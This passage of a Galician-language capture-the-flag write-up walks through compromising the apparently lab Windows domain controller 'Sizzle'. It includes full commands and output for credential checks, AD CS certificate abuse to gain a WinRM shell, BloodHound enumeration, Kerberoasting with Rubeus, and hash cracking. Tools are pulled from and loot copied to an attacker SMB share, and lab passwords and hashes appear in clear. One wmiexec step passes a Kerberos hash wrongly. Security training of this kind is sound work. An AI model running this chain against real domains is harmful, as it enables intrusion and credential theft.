+amanda:Ashare1972:HTB:aaaaaaaaaaaaaaaa:da2a23f18637081753f3cc42a08c2943:01010000000000000020cf9c0a76d80136ce6c14dbce1b250000
+000001001000540064006b005100770071006500670003001000540064006b0051007700710065006700020010006800640073004700770055
+004c006900040010006800640073004700770055004c006900070008000020cf9c0a76d8010600040002000000080030003000000000000000
+0100000000200000d985b54362899eb410d1e753db3de646b5394007aafb76d92da0d8e0da38d3150a00100000000000000000000000000000
+0000000900200063006900660073002f00310030002e00310030002e00310034002e0031003400000000000000000000000000
+
+$ cat credentials.txt
+amanda:Ashare1972\end{lstlisting}
+ 
+Agora con credenciais válidas imos revisar se temos acceso ao DC:
+        \begin{lstlisting}[language=Bash, caption=Comprobando credenciais usuario amanda, linewidth=18.7cm]
+$ crackmapexec smb 10.10.10.103 -u amanda -pAshare1972
+SMB   10.10.10.103 445 SIZZLE  [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
+SMB   10.10.10.103 445 SIZZLE  [+] HTB.LOCAL\amanda:Ashare1972
+ 
+$ crackmapexec winrm 10.10.10.103 -u amanda -pAshare1972
+SMB   10.10.10.103 5986   SIZZLE  [*] Windows 10.0 Build 14393 (name:SIZZLE) (domain:HTB.LOCAL)
+HTTP  10.10.10.103 5986   SIZZLE  [*] https://10.10.10.103:5986/wsman
+WINRM 10.10.10.103 5986   SIZZLE  [-] HTB.LOCAL\amanda:Ashare1972 "The server did not response with one of the following 
+authentication methods Negotiate, Kerberos, NTLM - actual: ''"\end{lstlisting}
+ 
+Existe pero non temos consola por winrm. Entón, imos probar ENUMERACIÓN LDAP con ese usuario.
+
+\subsubsection{Enumeración LDAP con credenciais: ldapdomaindump}
+Imos estudar o directorio ldap mediante \textbf{ldapdomaindump}:
+        \begin{lstlisting}[language=Bash, caption=ldapdomaindump]
+$ ldapdomaindump -u'htb.local\amanda' -p'Ashare1972' 10.10.10.103
+[*] Connecting to host...
+[*] Binding to host
+[+] Bind OK
+[*] Starting domain dump
+[+] Domain dump finished\end{lstlisting}             
+
+\vspace*{-1cm}
+Buscamos información do usuario amanda:
+        \begin{lstlisting}[language=Bash, caption=Información sobre o usuario amanda]
+$ firefox $(grep -Hi amanda *html | cut -d ':' -f1 | sort -u)\end{lstlisting}
+
+\vspace*{-0.4cm}
+Revisando a saída anterior no firefox, si atopamos que o usuario amanda pertence ao grupo Remote Management Users. Entón, debería ter acceso ao sistema, pero previamente comprobamos con crackmapexec que non o tiña. Pero comprobamos sen certificado no porto TCP 5985, e que pasa entón no porto 5986? Imos ver se somos quen de conseguir acceder mediante certificado por winrm, e conseguímolo mediante enumeración web (fuzzing).
+
+        \subsubsection{Enumeración servidor web}
+        \vspace{0.2cm}
+
+        \begin{schema}{TCP}
+        Porto
+        \where
+        80
+        \end{schema}
+
+\vspace*{-0.4cm}
+        Fuzzing no porto 80 amosa unha entrada ao sistema a través do cartafol \textit{/certsrv}, o cal amosa a interface \textit{Microsoft Active Directory Certificate Services  --  HTB-SIZZLE-CA} 
+        \begin{lstlisting}[language=Bash, caption=Fuzzing http]
+$ wfuzz -t 100 -c --hc=404 -z file,SecLists/Discovery/Web-Content/IIS.fuzz.txt http://10.10.10.103/FUZZ
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.103/FUZZ
+Total requests: 211
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000031:   401        29 L     100 W      1293 Ch     "/certsrv/mscep_admin"
+000000030:   401        29 L     100 W      1293 Ch     "/certsrv/"
+000000032:   401        29 L     100 W      1293 Ch     "/certsrv/mscep/mscep.dll"
+000000029:   403        29 L     92 W       1233 Ch     "/certenroll/"
+000000021:   403        29 L     92 W       1233 Ch     "/aspnet_client/"
+000000083:   403        29 L     92 W       1233 Ch     "/images/"
+000000094:   200        0 L      5 W        60 Ch       "# Look at the result codes in the headers - 403 likely mean the dir exists, 404  means not. It takes
+                                                        an ISAPI filter for IIS to return 404's for 403s."
+000000108:   400        6 L      26 W       324 Ch      "/%NETHOOD%/"
+000000127:   400        6 L      26 W       324 Ch      "/~/<script>alert('XSS')</script>.asp"
+000000129:   400        6 L      26 W       324 Ch      "/<script>alert('XSS')</script>.aspx"
+000000128:   400        6 L      26 W       324 Ch      "/~/<script>alert('XSS')</script>.aspx"
+
+Total time: 0
+Processed Requests: 211
+Filtered Requests: 200
+Requests/sec.: 0\end{lstlisting}
+
+Introducimos as credencias de amanda en http://10.10.10.103/certsrv/ 
+        \begin{figure}[h]
+                \centering
+                \includegraphics[width=0.4\textwidth]{\wfuzzMachine}
+                \caption{Fuzzing}
+        \end{figure}
+
+        \vspace{0.2cm}
+
+        Ben, entón a idea é conseguir unha key privada para o usuario \textit{amanda} coa cal pode acceder ao sistema mediante winrm. Para facer isto:
+        \begin{enumerate}[label=(\arabic*)]
+                \item Creamos unha solicitude de sinatura de certificado para o usuario \textit{amanda}
+                \item Facemos a petición coa solicitude do certificado anterior para conseguir a \textit{private key} do usuario \textit{amanda}
+        \end{enumerate}
+
+        Así,
+        \begin{enumerate}[label=(\arabic*)]
+                \item Creamos a solicitude de sinatura de certificado mediante \textit{openssl}:
+        \begin{lstlisting}[language=Bash, caption=openssl: cert.csr]
+$ openssl req -newkey rsa:2046 -nodes -keyout priv.key -out cert.csr\end{lstlisting}
+
+                \item Unha vez xerado o ficheiro \textit{cert.csr} enviamos a petición vía web para conseguir o certificado co que usuario \textit{amanda} poderá acceder ao sistema mediante winrm:
+        \begin{figure}[h]
+                \centering
+                \includegraphics[width=0.6\textwidth]{\wfuzzCertMachine}
+                \caption{Request a certificate}
+        \end{figure}
+ 
+        \begin{figure}[h]
+                \centering
+                \includegraphics[width=0.7\textwidth]{\wfuzzRequestCertMachine}
+                \caption{Advanced certificate request}
+        \end{figure}
+        
+        \begin{figure}[h]
+                \centering
+                \includegraphics[width=0.7\textwidth]{\wfuzzAdvancedDownloadCertMachine}
+                \caption{Download certificate: Base 64 encoded}
+        \end{figure}
+        
+        \begin{figure}[h]
+                \centering
+                \includegraphics[width=0.7\textwidth]{\wfuzzDownloadCertRequiredMachine}
+                \caption{Submit}
+        \end{figure}
+
+
+        \end{enumerate}
+
+
+
+        \clearpage
+
+        Con este cerficado descargado \textbf{certnew.cer} poderemos acceder co usuario \textit{amanda} mediante \textit{winrm}:
+        \begin{lstlisting}[language=Bash, caption=Acceso ao sistema]
+$ evil-winrm -i 10.10.10.103 -u 'amanda' -p'Ashare1972' -S -P 5986 -c certnew.cer -k priv.key
+ 
+Evil-WinRM shell v3.3
+ 
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+ 
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+ 
+Warning: SSL enabled
+ 
+Info: Establishing connection to remote endpoint
+ 
+*Evil-WinRM* PS C:\Users\amanda\Documents> dir\end{lstlisting}
+
+
+
+        \clearpage
+        \section{Movemento lateral}
+        \vspace{0.2cm}
+        Revisamos se conseguimos a flag user.txt onde se espera \textit{-no cartafol desktop do usuario-}:
+        \begin{lstlisting}[language=Bash, caption=Desktop]
+*Evil-WinRM* PS C:\Users\amanda\Documents> dir ..\desktop --force\end{lstlisting}
+
+        Non existe a flag, co cal comprobamos o acceso ás contas doutros usuarios:
+        \begin{lstlisting}[language=Bash, caption=Outros usuarios existentes no sistema, linewidth=18.7cm]
+*Evil-WinRM* PS C:\Users\amanda\Documents> dir c:\users\administrator
+Access to the path 'C:\users\administrator' is denied.
+At line:1 char:1
++ dir c:\users\administrator
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\users\administrator:String) [Get-ChildItem], UnauthorizedAccessException
+    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+*Evil-WinRM* PS C:\Users\amanda\Documents> dir c:\users\mrlky
+Access to the path 'C:\users\mrlky' is denied.
+At line:1 char:1
++ dir c:\users\mrlky
++ ~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\users\mrlky:String) [Get-ChildItem], UnauthorizedAccessException
+    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+*Evil-WinRM* PS C:\Users\amanda\Documents> dir c:\users\mrlky.HTB
+Access to the path 'C:\users\mrlky.HTB' is denied.
+At line:1 char:1
++ dir c:\users\mrlky.HTB
++ ~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\users\mrlky.HTB:String) [Get-ChildItem], UnauthorizedAccessException
+    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+*Evil-WinRM* PS C:\Users\amanda\Documents>\end{lstlisting}
+
+Non temos acceso ao cartafol doutros usuarios, co cal imos ver se somos quen de acceder con outro usuario investigando posibles fallas mediante \href{https://github.com/sponsors/carlospolop}{\textcolor{blue}winpeas}:
+        \begin{lstlisting}[language=Bash, caption=winpeas]
+*Evil-WinRM* PS C:\Users\amanda\Documents> mkdir c:\windows\temp\temp
+*Evil-WinRM* PS C:\Users\amanda\Documents> cd c:\windows\temp\temp
+
+$ impacket-smbserver -smb2support TMP $(pwd)
+Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+
+*Evil-WinRM* PS C:\windows\temp\temp> copy //10.10.14.12/TMP/winPEASx64.exe winPEASx64.exe
+*Evil-WinRM* PS C:\windows\temp\temp> dir
+
+
+    Directory: C:\windows\temp\temp
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        5/31/2022   8:27 PM        1936384 winPEASx64.exe
+
+
+*Evil-WinRM* PS C:\windows\temp\temp> . .\winPEASx64.exe\end{lstlisting}
+
+Non vemos nada de interese, entón probamos con sharphound.
+
+\subsection{Enumeración LDAP con credenciais: sharphound}
+Imos estudar o directorio ldap mediante \textbf{sharphound}:
+        \begin{lstlisting}[language=Bash, caption=sharphound, linewidth=18.4cm]
+*Evil-WinRM* PS C:\windows\temp\temp> copy //10.10.14.12/TMP/SharpHound.exe SharpHound.exe
+*Evil-WinRM* PS C:\windows\temp\temp> dir
+
+
+    Directory: C:\windows\temp\temp
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        6/11/2022   1:56 PM         906752 SharpHound.exe
+-a----        5/31/2022   8:27 PM        1936384 winPEASx64.exe
+
+
+*Evil-WinRM* PS C:\windows\temp\temp> . .\SharpHound.exe
+2022-07-19T06:52:55.3727300-04:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, 
+ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2022-07-19T06:52:55.3727300-04:00|INFORMATION|Initializing SharpHound at 6:52 AM on 7/19/2022
+2022-07-19T06:52:55.7008570-04:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, 
+RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2022-07-19T06:52:55.9196035-04:00|INFORMATION|Beginning LDAP search for HTB.LOCAL
+2022-07-19T06:52:55.9664872-04:00|INFORMATION|Producer has finished, closing LDAP channel
+2022-07-19T06:52:55.9664872-04:00|INFORMATION|LDAP channel closed, waiting for consumers
+2022-07-19T06:53:25.9665600-04:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
+2022-07-19T06:53:40.2165680-04:00|INFORMATION|Consumers finished, closing output channel
+2022-07-19T06:53:40.2634463-04:00|INFORMATION|Output channel closed, waiting for output task to complete
+Closing writers
+2022-07-19T06:53:40.8572027-04:00|INFORMATION|Status: 94 objects finished (+94 2.136364)/s -- Using 56 MB RAM
+2022-07-19T06:53:40.8572027-04:00|INFORMATION|Enumeration finished in 00:00:44.9479589
+2022-07-19T06:53:41.0449091-04:00|INFORMATION|SharpHound Enumeration Completed at 6:53 AM on 7/19/2022! Happy Graphing!
+*Evil-WinRM* PS C:\windows\temp\temp> dir
+
+
+    Directory: C:\windows\temp\temp
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        7/19/2022   6:53 AM          10960 20220719065340_BloodHound.zip
+-a----        7/19/2022   6:53 AM           8127 MjA1NTZjODAtYTQzYS00OWY1LWFiOTAtMjFmYTQ1MmY1YTU4.bin
+-a----        6/11/2022   1:56 PM         906752 SharpHound.exe
+-a----        5/31/2022   8:27 PM        1936384 winPEASx64.exe
+
+
+*Evil-WinRM* PS C:\windows\temp\temp> copy 20220719065340_BloodHound.zip //10.10.14.12/TMP/20220719065340_BloodHound.zip\end{lstlisting}
+
+Imos descomprimir o zip e subir os arquivos json recolectados a bloodhound:
+       \begin{figure}[h]
+                \centering
+                \includegraphics[width=0.6\textwidth]{\sharphounduploadDatasizzle}
+                \caption{Upload Data}
+        \end{figure}
+\clearpage
+\vspace*{-1.2cm}
+        \begin{lstlisting}[language=Bash, caption=bloodhound, linewidth=17.7cm]
+$ unzip 20220719065340_BloodHound.zip
+Archive:  20220719065340_BloodHound.zip
+  inflating: 20220719065340_computers.json
+  inflating: 20220719065340_users.json
+  inflating: 20220719065340_groups.json
+  inflating: 20220719065340_containers.json
+  inflating: 20220719065340_domains.json
+  inflating: 20220719065340_gpos.json
+  inflating: 20220719065340_ous.json
+
+$ sudo neo4j console
+$ bloodhound >/dev/null 2>&1 &;disown\end{lstlisting}             
+
+\vspace*{-0.6cm}
+Investigando:
+        \begin{enumerate}[label=(\arabic*)]
+                \item Buscamos o principal \textit{amanda} e marcámolo como \textit{Owned}
+       \begin{figure}[h]
+                \centering
+                \includegraphics[width=0.6\textwidth]{\sharphoundOwnedsizzle}
+                \caption{Owned}
+        \end{figure}
+
+\vspace*{-0.4cm}
+                \item Buscamos paths a \textit{Domain Admins} dende usuarios \textit{Owned}.
+       \begin{figure}[h]
+                \centering
+                \includegraphics[width=0.6\textwidth]{\sharphoundpathstoDomainAdminssizzle}
+                \caption{Paths to Domain Admins}
+        \end{figure}
+
+\vspace*{-0.4cm}
+                \item Como non atopamos nada, buscamos o principal \textit{mrlky} e marcámolo como \textit{High Value}
+       \begin{figure}[h]
+                \centering
+                \includegraphics[width=0.6\textwidth]{\sharphoundHighValuesizzle}
+                \caption{High Value}
+        \end{figure}
+
+\clearpage
+                \item Buscamos paths a \textit{Domain Admins} dende usuarios \textit{High value}
+       \begin{figure}[h]
+                \centering
+                \includegraphics[width=0.6\textwidth]{\sharphoundpathstoDomainAdminsfromHighValuesizzle}
+                \caption{Paths to Domain Admins from High Value}
+        \end{figure}
+
+                \item Como seguimos sen atopar nada, buscamos en \textit{Dangerous Rights} por \textit{Find Principals witch DCSync Rights}. Agora atopamos que o principal \textit{mrlky} posúe permisos \textit{GetChangesAll} sobre o dominio \textit{HTB.LOCAL}. Entón, debemos chegar a ser \textit{mrlky} e así poder escalar privilexios a \textit{Domain Admin}
+       \begin{figure}[h]
+                \centering
+                \includegraphics[width=0.6\textwidth]{\sharphoundmrlkyDCSyncRightssizzle}
+                \caption{DCSync Rights}
+        \end{figure}
+
+
+                \item Buscamos como chegar a acceder ao sistema como \textit{mrlky}. Para iso \textit{Shortest Paths to Here from Owned}, pero non atopamos nada. Entón intentamos con \textit{Shortest Paths to Here} e tampouco. Kerberos? Buscamos \textit{List all Kerberoastable accounts}. E si, obtemos que o principal \textit{mrlky} é kerberoastable.
+
+       \begin{figure}[h]
+       \begin{minipage}{0.48\textwidth}
+                \centering
+                \includegraphics[width=0.7\linewidth]{\sharphoundmrlkyPathsfromOwnedsizzle}
+                \caption{Paths from Owned}
+       \end{minipage}\hfill
+       \begin{minipage}{0.48\textwidth}
+                \centering
+                \includegraphics[width=0.7\linewidth]{\sharphoundmrlkyPathstoHeresizzle}
+                \caption{Paths to Here}
+       \end{minipage}
+       \end{figure}
+
+\clearpage
+       \begin{figure}[h]
+                \centering
+                \includegraphics[width=0.8\textwidth]{\sharphoundkerberoastableaccountssizzle}
+                \caption{Kerberoastable Accounts}
+        \end{figure}
+
+
+        \begin{lstlisting}[language=Bash, caption=KerberosAsting Attack]
+$ GetUserSPNs.py htb.local/amanda:Ashare1972 -request -dc-ip 10.10.10.103
+Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation
+
+ServicePrincipalName  Name   MemberOf                                               ...
+--------------------  -----  -----------------------------------------------------  ...
+http/sizzle           mrlky  CN=Remote Management Users,CN=Builtin,DC=HTB,DC=LOCAL  ...
+
+
+
+[-] CCache file is not found. Skipping...
+[-] [Errno Connection error (10.10.10.103:88)] [Errno 110] Connection timed out\end{lstlisting}
+
+O erro de conexión é normal xa que sabiamos que o porto TCP 88 non estaba aberto. Entón:
+
+        \begin{lstlisting}[language=Bash, caption=netstat]
+*Evil-WinRM* PS C:\Users\amanda\Documents> netstat -n
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State
+  TCP    10.10.10.103:5986      10.10.14.12:48930      ESTABLISHED
+  TCP    [::1]:389              [::1]:49694            ESTABLISHED
+  TCP    [::1]:389              [::1]:49695            ESTABLISHED
+  TCP    [::1]:389              [::1]:55258            ESTABLISHED
+  TCP    [::1]:49668            [::1]:49717            ESTABLISHED
+  TCP    [::1]:49694            [::1]:389              ESTABLISHED
+  TCP    [::1]:49695            [::1]:389              ESTABLISHED
+  TCP    [::1]:49717            [::1]:49668            ESTABLISHED
+  TCP    [::1]:55258            [::1]:389              ESTABLISHED
+  TCP    [dead:beef::89b1:278f:efde:2239]:389  [dead:beef::89b1:278f:efde:2239]:60696  ESTABLISHED
+  TCP    [dead:beef::89b1:278f:efde:2239]:60696  [dead:beef::89b1:278f:efde:2239]:389  ESTABLISHED
+  TCP    [fe80::89b1:278f:efde:2239%4]:389  [fe80::89b1:278f:efde:2239%4]:55265  ESTABLISHED
+  TCP    [fe80::89b1:278f:efde:2239%4]:389  [fe80::89b1:278f:efde:2239%4]:55267  ESTABLISHED
+  TCP    [fe80::89b1:278f:efde:2239%4]:389  [fe80::89b1:278f:efde:2239%4]:55271  ESTABLISHED
+  TCP    [fe80::89b1:278f:efde:2239%4]:49668  [fe80::89b1:278f:efde:2239%4]:50116  ESTABLISHED
+  TCP    [fe80::89b1:278f:efde:2239%4]:50116  [fe80::89b1:278f:efde:2239%4]:49668  ESTABLISHED
+  TCP    [fe80::89b1:278f:efde:2239%4]:55135  [fe80::89b1:278f:efde:2239%4]:135  TIME_WAIT
+  TCP    [fe80::89b1:278f:efde:2239%4]:55136  [fe80::89b1:278f:efde:2239%4]:49668  TIME_WAIT
+  TCP    [fe80::89b1:278f:efde:2239%4]:55265  [fe80::89b1:278f:efde:2239%4]:389  ESTABLISHED
+  TCP    [fe80::89b1:278f:efde:2239%4]:55267  [fe80::89b1:278f:efde:2239%4]:389  ESTABLISHED
+  TCP    [fe80::89b1:278f:efde:2239%4]:55271  [fe80::89b1:278f:efde:2239%4]:389  ESTABLISHED
+\end{lstlisting}
+
+Tampouco temos o porto 88 aberto en local, co cal non podemos redireccionar o porto. Que tal se empregamos \textit{Rubeus}?
+
+        \end{enumerate}        
+
+\clearpage
+\subsection{Rubeus: kerberoasting attack}
+        \begin{lstlisting}[language=Bash, caption=KerberosAsting Attack, linewidth=17.8cm]
+*Evil-WinRM* PS C:\windows\temp\temp> copy //10.10.14.12/TMP/Rubeus.exe Rubeus.exe
+*Evil-WinRM* PS C:\windows\temp\temp> ./Rubeus.exe kerberoast /creduser:HTB.LOCAL\amanda /credpassword:Ashare1972
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.3
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target Domain          : HTB.LOCAL
+[*] Searching path 'LDAP://sizzle.HTB.LOCAL/DC=HTB,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)
+(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+
+[*] SamAccountName         : mrlky
+[*] DistinguishedName      : CN=mrlky,CN=Users,DC=HTB,DC=LOCAL
+[*] ServicePrincipalName   : http/sizzle
+[*] PwdLastSet             : 7/10/2018 2:08:09 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle@HTB.LOCAL*$C8B04860ABD4D1D0917DC9E6E46B
+                             3C45$ADE793C7898357764ECA1FF5EBBF8145EEE6BF79D760F8914D82CF3872B8D8CC02AB76D9B2E
+                             7350C0CD393D28A703C7986E4EB2706E40DFDDF8F391F64C856D354CCF70671060CE8A78E26C45BE
+                             F5B03FC31B99EDA445455E98C089BB1476065AE3501202EBB8DE0F5D8E9311CA466DB7411F6C0685
+                             A3A430F6198294071EACDC1711E12C8407E606EA43084AB2E208D55E95F3ADCFD4E995EBB9F8B2CE
+                             F12C1A02333BAFD87321231B7C4F86A683AF0C99F23AE1CB83589137C590E63D563912C4D454722A
+                             7F360F118D3980487F8BA03352D5437B57FB46F5DF22E28E9D47B48F9BD5D7BD086425EC4F8453C1
+                             5561CFFEF07B7C7EA2720EC10A9975258393535194AB50B2047D92742D75BCC0DDF93C9B08435C17
+                             8FD75B2FB29592B3301134E7132C36029D3C4ED775AA105C2E700796DF8509195BFF1D91B174CE1E
+                             A40626E6A4DAD6298E235AA99A54AB89404657622A4DFA3B5C6FE5AEBA880D420BE99F449654AD17
+                             9CA1A69E7AE48AAC6805E23B8823DF92DF19E55021ACF4AE07CF7407873CB18E5F5E86DB34D12FE0
+                             6CB2424AD972F744B2990DC9D8AC78152401615ACB7FB3C5EE0BA6C7A74DD002E8F54C57C346D500
+                             3B216190D55D03889B8ADBAEB41E4475136624A350F091BC2193475EB4BA23C43AC74F803830CCFB
+                             129C744CC8B2268730AD006F25820DD9A751C73B63C41C017360AC1FACD9B3789D28A62F47429711
+                             D5DCEC1FFC16435AB0EECA756AFE6592A6F7DBEA0FEF6948A92E22543C0E35683AB467C97A95B8E9
+                             0CAD017710776124F03390F557F95DC74BB18797442648C11D98DAB02798DA0A6453156417B70118
+                             8189E30123D4E0B6F2625D4A6D8EB569F2CBADDC376B419471DC323DCB6ECD4D079E30E9E3C6641E
+                             66244B6776C0C0946849B138AF0B9FBB60A05D267FBFD0BDDE23B3ED09BB0EFF3A2561E3E9A67314
+                             FD7A64F5002897227884E1E1AD83552821981F4A8BC662F19E8EDEAB2392995EF1A7A3C2B396855F
+                             5E29A86007A8A40D3CE5EEF4905D602736F0FD4391E60FF92D415FFAECC6E84B50865C730393E8DF
+                             2D8E603CA896F94EEB3503C3FDC42886FA4FB0B4D755F171AADF37C2F4B8671FCDAE3F496882D9E0
+                             94660185BA73B5713EDE5BC7688BA9C5FA6D359CF849CF07761BABCA70A714C3F622AA7DF860913A
+                             83A1B9B89A14B36BC8A527CAF73413E2C7E306866D17753B7ACE52DC10CAC8D41BA0E54C7AB4FCCD
+                             B77452BCC462F5CB89E0F8DC512FCDA7CBDFA3B51E51A0BFA91F4EF12DF8F4019AF0942E73E25868
+                             7D98156C0D70BAB20761CD96DEA02BBD787BA1F9D9828C743F9586CEF8B9F6C71CE8C26042DA1FD1
+                             E86674AD741AD2AFB
+
+*Evil-WinRM* PS C:\windows\temp\temp>
+
+
+$ wmiexec.py htb.local/mrlky@10.10.10.103 -hashes 
+$krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle@HTB.LOCAL*$C8B04860ABD4D1D0917DC9E6E46B
+3C45$ADE793C7898357764ECA1FF5EBBF8145EEE6BF79D760F8914D82CF3872B8D8CC02AB76D9B2E
+7350C0CD393D28A703C7986E4EB2706E40DFDDF8F391F64C856D354CCF70671060CE8A78E26C45BE
+F5B03FC31B99EDA445455E98C089BB1476065AE3501202EBB8DE0F5D8E9311CA466DB7411F6C0685
+A3A430F6198294071EACDC1711E12C8407E606EA43084AB2E208D55E95F3ADCFD4E995EBB9F8B2CE
+F12C1A02333BAFD87321231B7C4F86A683AF0C99F23AE1CB83589137C590E63D563912C4D454722A
+7F360F118D3980487F8BA03352D5437B57FB46F5DF22E28E9D47B48F9BD5D7BD086425EC4F8453C1
+5561CFFEF07B7C7EA2720EC10A9975258393535194AB50B2047D92742D75BCC0DDF93C9B08435C17
+8FD75B2FB29592B3301134E7132C36029D3C4ED775AA105C2E700796DF8509195BFF1D91B174CE1E
+A40626E6A4DAD6298E235AA99A54AB89404657622A4DFA3B5C6FE5AEBA880D420BE99F449654AD17
+9CA1A69E7AE48AAC6805E23B8823DF92DF19E55021ACF4AE07CF7407873CB18E5F5E86DB34D12FE0
+6CB2424AD972F744B2990DC9D8AC78152401615ACB7FB3C5EE0BA6C7A74DD002E8F54C57C346D500
+3B216190D55D03889B8ADBAEB41E4475136624A350F091BC2193475EB4BA23C43AC74F803830CCFB
+129C744CC8B2268730AD006F25820DD9A751C73B63C41C017360AC1FACD9B3789D28A62F47429711
+D5DCEC1FFC16435AB0EECA756AFE6592A6F7DBEA0FEF6948A92E22543C0E35683AB467C97A95B8E9
+0CAD017710776124F03390F557F95DC74BB18797442648C11D98DAB02798DA0A6453156417B70118
+8189E30123D4E0B6F2625D4A6D8EB569F2CBADDC376B419471DC323DCB6ECD4D079E30E9E3C6641E
+66244B6776C0C0946849B138AF0B9FBB60A05D267FBFD0BDDE23B3ED09BB0EFF3A2561E3E9A67314
+FD7A64F5002897227884E1E1AD83552821981F4A8BC662F19E8EDEAB2392995EF1A7A3C2B396855F
+5E29A86007A8A40D3CE5EEF4905D602736F0FD4391E60FF92D415FFAECC6E84B50865C730393E8DF
+2D8E603CA896F94EEB3503C3FDC42886FA4FB0B4D755F171AADF37C2F4B8671FCDAE3F496882D9E0
+94660185BA73B5713EDE5BC7688BA9C5FA6D359CF849CF07761BABCA70A714C3F622AA7DF860913A
+83A1B9B89A14B36BC8A527CAF73413E2C7E306866D17753B7ACE52DC10CAC8D41BA0E54C7AB4FCCD
+B77452BCC462F5CB89E0F8DC512FCDA7CBDFA3B51E51A0BFA91F4EF12DF8F4019AF0942E73E25868
+7D98156C0D70BAB20761CD96DEA02BBD787BA1F9D9828C743F9586CEF8B9F6C71CE8C26042DA1FD1
+E86674AD741AD2AFB\end{lstlisting}
+
+\subsection{Credenciais usuario mrlky: john the ripper, hashcat}
+Conseguimos o hash do usuario \textbf{mrlky}, do cal imos intentar descubrir o contrasinal mediante \textbf{John The Ripper} e \textbf{Hashcat}:
+        \begin{lstlisting}[language=Bash, caption=Credenciais mediante John The Ripper, linewidth=17.8cm]
+
+$ cat hash-kerberoasting.txt
+$krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle@HTB.LOCAL*$C8B04860ABD4D1D0917DC9E6E46...
+
+$ john --wordlist=/usr/share/wordlists/rockyou.txt hash-kerberoasting.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:24 74.60% (ETA: 16:45:50) 0g/s 444745p/s 444745c/s 444745C/s ROYALTY5..ROY2007
+Football#7       (?)
+1g 0:00:00:25 DONE (2022-07-19 16:45) 0.03980g/s 444550p/s 444550c/s 444550C/s Football0..FoodScience22
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+$ john --show hash-kerberoasting.txt
+?:Football#7
+
+1 password hash cracked, 0 left\end{lstlisting}
+
+        \begin{lstlisting}[language=Bash, caption=Credenciais mediante Hashcat, linewidth=17.8cm]
+$ cat hash-kerberoasting.txt
+$krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle@HTB.LOCAL*$C8B04860ABD4D1D0917DC9E6E46...
+
+$ hashcat -m 13100 -a 0 hash-kerberoasting.txt /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.5) starting
+
+OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) ...
+========================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i5-6300U CPU @ 2.40GHz, 1441/2947 MB (512 MB allocatable), 1MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+Cracking performance lower than expected?
+
+* Append -O to the commandline.
